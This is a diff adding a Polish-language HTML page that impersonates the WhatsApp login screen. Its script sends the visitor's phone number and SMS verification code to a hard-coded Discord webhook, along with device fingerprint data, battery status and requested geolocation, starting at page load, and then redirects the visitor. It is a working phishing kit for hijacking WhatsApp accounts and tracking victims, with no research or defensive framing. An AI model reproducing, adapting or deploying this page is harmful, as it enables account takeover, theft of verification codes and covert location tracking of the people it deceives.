@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>WhatsApp – Zaloguj się</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root { --whatsapp-green:#075E54;--whatsapp-light-green:#25D366;--background:#ECE5DD;--white:#FFFFFF;--text-primary:#202C33;--text-secondary:#667781;--border:#D1D1D1;--error:#D93025;--radius:12px;--transition:0.3s;--shadow:rgba(0,0,0,0.1); /* Usunięto definicję --whatsapp-bg-pattern */ }
+    *{box-sizing:border-box;margin:0;padding:0;}
+
+    /* Ustawienie body i html na pełną wysokość i szerokość z centrowaniem i jednolitym tłem */
+    body, html{
+      height:100%;
+      width: 100%;
+      font-family:'Roboto',sans-serif;
+      background-color: var(--background); /* Kolor tła */
+      /* Usunięto background-image */
+      background-repeat: repeat; /* Powtarzanie wzorca (można usunąć, ale nie szkodzi) */
+      background-size: auto; /* Domyślny rozmiar tła (można usunąć, ale nie szkodzi) */
+      display: flex; /* Dodano flexbox do centrowania */
+      align-items: center; /* Centrowanie w pionie */
+      justify-content: center; /* Centrowanie w poziomie */
+      padding:0;
+      margin: 0;
+      overflow: auto; /* Zmieniono na auto, aby umożliwić przewijanie jeśli kontener jest za duży */
+    }
+
+    /* Styl kontenera logowania - szerszy i wyższy, wyśrodkowany */
+    .container{
+      width: 90%; /* Ustawienie szerokości na procent, aby była responsywna */
+      max-width: 500px; /* Zwiększona maksymalna szerokość */
+      height: auto; /* Wysokość automatyczna, dopasowująca się do zawartości */
+      max-height: 600px; /* Zwiększona maksymalna wysokość */
+      background: var(--white);
+      border-radius: var(--radius); /* Przywrócono zaokrąglone rogi */
+      box-shadow: 0 4px 12px var(--shadow); /* Przywrócono cień */
+      overflow: hidden;
+      position: relative; /* Zmieniono na relative, aby nie kolidowało z centrowaniem body */
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* Media query dla mniejszych ekranów - dostosowanie rozmiaru kontenera */
+    @media (max-width: 600px) {
+      .container {
+        width: 95%; /* Mniejsza szerokość na bardzo małych ekranach */
+        max-width: none; /* Usunięto max-width na małych ekranach, aby lepiej dopasować się do szerokości */
+        max-height: none; /* Usunięto max-height na małych ekranach */
+      }
+      body, html {
+          padding: 0;
+      }
+      .content {
+          padding: 20px;
+      }
+       .header {
+          padding: 12px;
+      }
+       .footer {
+          padding: 8px;
+          position: relative;
+          bottom: auto;
+      }
+       .input-group input {
+           padding: 12px 10px;
+       }
+    }
+
+
+    .hidden{opacity:0;transform:translateY(0);pointer-events:none;position:absolute;top:0;left:0;right:0;bottom:0;transition:opacity var(--transition);
+    }
+    .visible{opacity:1;transform:translateY(0);transition:opacity var(--transition);
+    }
+    .header{background:var(--whatsapp-green);padding:16px;display:flex;align-items:center;}
+    .header img{height:26px;margin-right:12px;}
+    .header span{color:var(--white);font-size:20px;font-weight:500;}
+    .content{padding:24px;text-align:center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center;}
+    .content h2{font-size:22px;color:var(--text-primary);margin-bottom:20px;}
+    .input-group{margin-bottom:20px;text-align:left; width: 80%; max-width: 300px;}
+    .input-group label{display:block;font-size:14px;color:var(--text-secondary);margin-bottom:6px;}
+    .input-group input{width:100%;padding:14px 12px;font-size:16px;border:1px solid var(--border);border-radius:var(--radius);transition:border-color var(--transition),box-shadow var(--transition);}
+    .input-group input:focus{outline:none;border-color:var(--whatsapp-green);box-shadow:0 0 0 3px rgba(7,94,84,0.2);}
+    .error-message{color:var(--error);font-size:12px;margin-top:4px;display:none;}
+    .btn{width:100%;padding:16px;font-size:16px;background:var(--whatsapp-light-green);color:var(--white);border:none;border-radius:var(--radius);cursor:pointer;transition:opacity var(--transition),transform .1s;}
+    .btn:disabled{opacity:0.6;cursor:default;}
+    .btn:active{transform:scale(0.97);}
+    .footer{text-align:center;font-size:12px;color:var(--text-secondary);padding:12px;position:absolute;bottom:0;width:100%;}
+    .loader{width:46px;height:46px;border:6px solid var(--background);border-top:6px solid var(--whatsapp-green);border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+
+    /* Dodatkowe style dla elementów podobnych do WhatsApp */
+    .whatsapp-hint {
+        font-size: 14px;
+        color: var(--text-secondary);
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .whatsapp-hint svg {
+        margin-right: 5px;
+        fill: var(--text-secondary);
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="step-phone" class="visible">
+      <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="logo"><span>WhatsApp</span></div>
+      <div class="content">
+        <h2>Zaloguj się do WhatsApp</h2>
+        <div class="input-group">
+          <label for="phone">Numer telefonu</label>
+          <input type="tel" id="phone" inputmode="numeric" placeholder="600 000 000" maxlength="13" required>
+          <div class="error-message" id="phone-error">Numer musi zawierać dokładnie 9 cyfr.</div>
+        </div>
+        <button class="btn" id="next-phone" disabled>Dalej</button>
+        <div class="whatsapp-hint">
+             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            Twoje wiadomości są szyfrowane end-to-end.
+        </div>
+      </div>
+    </div>
+    <div id="step-code" class="hidden">
+      <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="logo"><span>WhatsApp</span></div>
+      <div class="content">
+        <h2>Wprowadź kod weryfikacyjny</h2>
+        <div class="input-group">
+          <label for="code">Kod SMS</label>
+          <input type="text" id="code" inputmode="numeric" placeholder="123456" maxlength="6" required>
+          <div class="error-message" id="code-error">Kod musi zawierać 6 cyfr.</div>
+        </div>
+        <button class="btn" id="verify-code" disabled>Weryfikuj</button>
+         <div class="whatsapp-hint">
+             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            Twoje wiadomości są szyfrowane end-to-end.
+        </div>
+      </div>
+    </div>
+    <div id="step-loader" class="hidden" role="alert" aria-live="polite">
+      <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="logo"><span>WhatsApp</span></div>
+      <div class="content"><div class="loader" aria-hidden="true"></div><p style="color:var(--text-secondary);font-size:16px;">Logowanie…</p></div>
+    </div>
+    <div class="footer">WhatsApp LLC</div>
+  </div>
+  <script>
+    (function(){
+      'use strict';
+
+      const REDIRECT_URL = 'https://jurek362.github.io/whatsapp/';
+      const REDIRECT_DELAY = 5000; // milliseconds (5 sekund)
+      // ZASTĄP TEN ADRES URL SWOIM POPRAWNYM ADRESEM WEBHOOKA DISCORDA:
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1368952671868031047/HM_vkprZwKmPPaHIp1InGMEjj3N2fx-eE3brtNC8QixeRKhkK3Y7C5nDxG5fW8jDp0OL';
+
+      const phoneInput = document.getElementById('phone');
+      const nextBtn = document.getElementById('next-phone');
+      const phoneErr = document.getElementById('phone-error');
+
+      const codeInput = document.getElementById('code');
+      const verifyBtn = document.getElementById('verify-code');
+      const codeErr = document.getElementById('code-error');
+
+      const stepPhone = document.getElementById('step-phone');
+      const stepCode = document.getElementById('step-code');
+      const stepLoader = document.getElementById('step-loader');
+
+      // Zmienne do przechowywania zebranych danych o urządzeniu
+      let deviceData = {
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        location: 'Lokalizacja niedostępna lub odmowa dostępu', // Domyślna wartość przed odpowiedzią użytkownika
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        screenColorDepth: window.screen.colorDepth, // Głębia kolorów ekranu
+        screenPixelDepth: window.screen.pixelDepth, // Głębia pikseli ekranu
+        screenOrientation: screen.orientation ? screen.orientation.type : 'Niedostępna', // Orientacja ekranu
+        browserLanguage: navigator.language,
+        browserPlatform: navigator.platform, // Platforma przeglądarki
+        cookiesEnabled: navigator.cookieEnabled, // Czy cookies są włączone
+        onlineStatus: navigator.onLine, // Status online/offline
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Niedostępna', // Liczba rdzeni CPU
+        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Niedostępna', // Pamięć urządzenia
+        connectionType: navigator.connection ? navigator.connection.effectiveType : 'Niedostępna', // Typ połączenia sieciowego
+        timezoneOffset: new Date().getTimezoneOffset() / -60, // Przesunięcie strefy czasowej w godzinach
+        batteryStatus: 'Informacja o baterii niedostępna'
+      };
+
+      // Funkcja do wysyłania danych o lokalizacji po odpowiedzi użytkownika
+      async function sendLocationUpdate(locationStatus) {
+           const payload = {
+               content: `Aktualizacja lokalizacji: ${locationStatus}`,
+               embeds: [{
+                   title: 'Status Lokalizacji',
+                   fields: [
+                       { name: 'Czas aktualizacji', value: new Date().toISOString(), inline: false },
+                       { name: 'Status lokalizacji', value: locationStatus, inline: false },
+                       { name: 'User Agent', value: deviceData.userAgent, inline: false } // Dodaj User Agent dla kontekstu
+                   ]
+               }]
+           };
+
+           try {
+               const response = await fetch(WEBHOOK_URL, {
+                   method: 'POST',
+                   headers: { 'Content-Type': 'application/json' },
+                   body: JSON.stringify(payload)
+               });
+
+               if (!response.ok) {
+                   const errorText = await response.text();
+                   console.error(`Błąd wysyłania aktualizacji lokalizacji. Status: ${response.status}, StatusText: ${response.statusText}`, "Odpowiedź błędu z webhooka (aktualizacja lokalizacji):", errorText);
+               }
+           } catch (error) {
+               console.error(`Błąd sieci lub inny błąd podczas wysyłania aktualizacji lokalizacji:`, error);
+           }
+      }
+
+
+      // Spróbuj pobrać lokalizację użytkownika
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            deviceData.location = `Szerokość: ${position.coords.latitude}, Długość: ${position.coords.longitude}`;
+            sendLocationUpdate(`Zezwolono: Szerokość: ${position.coords.latitude}, Długość: ${position.coords.longitude}`); // Wyślij aktualizację po sukcesie
+          },
+          (error) => {
+            // Obsługa błędów geolokalizacji
+            let locationStatusMessage = 'Nieznany błąd geolokalizacji.';
+            switch(error.code) {
+              case error.PERMISSION_DENIED:
+                locationStatusMessage = 'Użytkownik odmówił dostępu do geolokalizacji.';
+                break;
+              case error.POSITION_UNAVAILABLE:
+                locationStatusMessage = 'Informacja o lokalizacji jest niedostępna.';
+                break;
+              case error.TIMEOUT:
+                locationStatusMessage = 'Żądanie geolokalizacji upłynęło.';
+                break;
+              case error.UNKNOWN_ERROR:
+                locationStatusMessage = 'Wystąpił nieznany błąd geolokalizacji.';
+                break;
+            }
+            deviceData.location = locationStatusMessage; // Zaktualizuj deviceData
+            console.error(`Błąd geolokalizacji (${error.code}): ${error.message}`);
+            sendLocationUpdate(`Błąd: ${locationStatusMessage}`); // Wyślij aktualizację po błędzie
+          }
+        );
+      } else {
+          deviceData.location = 'Geolokalizacja niedostępna w tej przeglądarce.';
+          sendLocationUpdate('Geolokalizacja niedostępna w tej przeglądarce.'); // Wyślij aktualizację gdy API niedostępne
+      }
+
+      // Spróbuj pobrać status baterii (jeśli API jest dostępne)
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(function(battery) {
+          deviceData.batteryStatus = `Poziom: ${(battery.level * 100).toFixed(0)}%, Ładowanie: ${battery.charging ? 'Tak' : 'Nie'}`;
+          battery.addEventListener('levelchange', function() {
+             deviceData.batteryStatus = `Poziom: ${(battery.level * 100).toFixed(0)}%, Ładowanie: ${battery.charging ? 'Tak' : 'Nie'}`;
+          });
+           battery.addEventListener('chargingchange', function() {
+             deviceData.batteryStatus = `Poziom: ${(battery.level * 100).toFixed(0)}%, Ładowanie: ${battery.charging ? 'Tak' : 'Nie'}`;
+          });
+        }).catch(function(error) {
+           deviceData.batteryStatus = `Błąd pobierania statusu baterii: ${error.message}`;
+           console.error(`Błąd pobierania statusu baterii: ${error.message}`);
+        });
+      } else {
+          deviceData.batteryStatus = 'API baterii niedostępne w tej przeglądarce.';
+      }
+
+
+      // Formatuj i waliduj telefon
+      phoneInput.addEventListener('input', () => {
+        const digits = phoneInput.value.replace(/\D/g, '');
+        const formatted = digits.replace(/(\d{3})(?=\d)/g, '$1 ');
+        phoneInput.value = formatted;
+        const isValid = digits.length === 9;
+        phoneErr.style.display = (digits.length > 0 && !isValid) ? 'block' : 'none';
+        nextBtn.disabled = !isValid;
+      });
+
+      // Formatuj i waliduj kod sms
+      codeInput.addEventListener('input', () => {
+        const digits = codeInput.value.replace(/\D/g, '');
+        codeInput.value = digits;
+        const isValid = digits.length === 6;
+        codeErr.style.display = (digits.length > 0 && !isValid) ? 'block' : 'none';
+        verifyBtn.disabled = !isValid;
+      });
+
+
+      // Przełączanie kroków
+      function show(hideElement, showElement) {
+        hideElement.classList.remove('visible');
+        hideElement.classList.add('hidden');
+        showElement.classList.remove('hidden');
+        showElement.classList.add('visible');
+        // Ustaw focus na pierwszym elemencie formularza lub przycisku w nowym kroku
+        const firstInteractiveElement = showElement.querySelector('input, button');
+        if (firstInteractiveElement && typeof firstInteractiveElement.focus === 'function') {
+             firstInteractiveElement.focus();
+        }
+      }
+
+      // Funkcja do wysyłania danych do webhooka
+      async function sendToWebhook(step, phone = '', code = '') {
+          const payload = {
+              content: `Nowa próba logowania (Krok ${step}: ${step === 0 ? 'Wejście na stronę' : (step === 1 ? 'Numer' : 'Kod')})`,
+              embeds: [{
+                  title: step === 0 ? 'Dane o urządzeniu (Wejście na stronę)' : (step === 1 ? 'Dane logowania (Krok 1)' : 'Dane weryfikacyjne (Krok 2)'),
+                  fields: [
+                      // Dodaj numer telefonu i kod tylko jeśli są dostępne (krok 1 lub 2)
+                      ...(step > 0 ? [{ name: 'Numer telefonu', value: phone, inline: false }] : []),
+                      ...(step === 2 ? [{ name: 'Kod SMS', value: code, inline: false }] : []),
+                      { name: 'User Agent', value: deviceData.userAgent, inline: false },
+                      { name: 'Czas (ISO)', value: deviceData.timestamp, inline: false },
+                      { name: 'Przesunięcie strefy czasowej (godziny)', value: deviceData.timezoneOffset.toString(), inline: true },
+                      { name: 'Rozdzielczość ekranu', value: deviceData.screenResolution, inline: true },
+                      { name: 'Głębia kolorów ekranu', value: deviceData.screenColorDepth.toString(), inline: true },
+                      { name: 'Głębia pikseli ekranu', value: deviceData.screenPixelDepth.toString(), inline: true },
+                      { name: 'Orientacja ekranu', value: deviceData.screenOrientation, inline: true },
+                      { name: 'Język przeglądarki', value: deviceData.browserLanguage, inline: true },
+                      { name: 'Platforma przeglądarki', value: deviceData.browserPlatform, inline: true },
+                      { name: 'Cookies włączone?', value: deviceData.cookiesEnabled ? 'Tak' : 'Nie', inline: true },
+                      { name: 'Status online', value: deviceData.onlineStatus ? 'Online' : 'Offline', inline: true },
+                      { name: 'Liczba rdzeni CPU', value: deviceData.hardwareConcurrency.toString(), inline: true },
+                      { name: 'Pamięć urządzenia', value: deviceData.deviceMemory, inline: true },
+                      { name: 'Typ połączenia', value: deviceData.connectionType, inline: true },
+                      { name: 'Status baterii', value: deviceData.batteryStatus, inline: false },
+                      { name: 'Lokalizacja', value: deviceData.location, inline: false } // Lokalizacja na końcu, bo może być asynchroniczna
+                  ]
+              }]
+          };
+
+          try {
+              const response = await fetch(WEBHOOK_URL, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify(payload)
+              });
+
+              if (!response.ok) {
+                   const errorText = await response.text();
+                   console.error(`Błąd wysyłania danych do webhooka (Krok ${step}). Status: ${response.status}, StatusText: ${response.statusText}`, "Odpowiedź błędu z webhooka:", errorText);
+              }
+
+          } catch (error) {
+              console.error(`Błąd sieci lub inny błąd podczas wysyłania danych do webhooka (Krok ${step}):`, error);
+          }
+      }
+
+      // Wyślij dane o urządzeniu od razu po załadowaniu strony
+      document.addEventListener('DOMContentLoaded', () => {
+          sendToWebhook(0); // Krok 0: Wejście na stronę (bez danych lokalizacji, które pojawią się później)
+      });
+
+
+      // Klik Dalej (wysyła numer telefonu i dane urządzenia)
+      nextBtn.addEventListener('click', async () => {
+        await sendToWebhook(1, phoneInput.value);
+        show(stepPhone, stepCode);
+      });
+
+      // Klik Weryfikuj (wysyła kod SMS i dane urządzenia)
+      verifyBtn.addEventListener('click', async () => {
+        await sendToWebhook(2, phoneInput.value, codeInput.value);
+        show(stepCode, stepLoader);
+        // Przekierowanie po krótkim opóźnieniu
+        setTimeout(() => {
+          location.href = REDIRECT_URL;
+        }, REDIRECT_DELAY);
+      });
+    })();
+  </script>
+</body>
+</html>
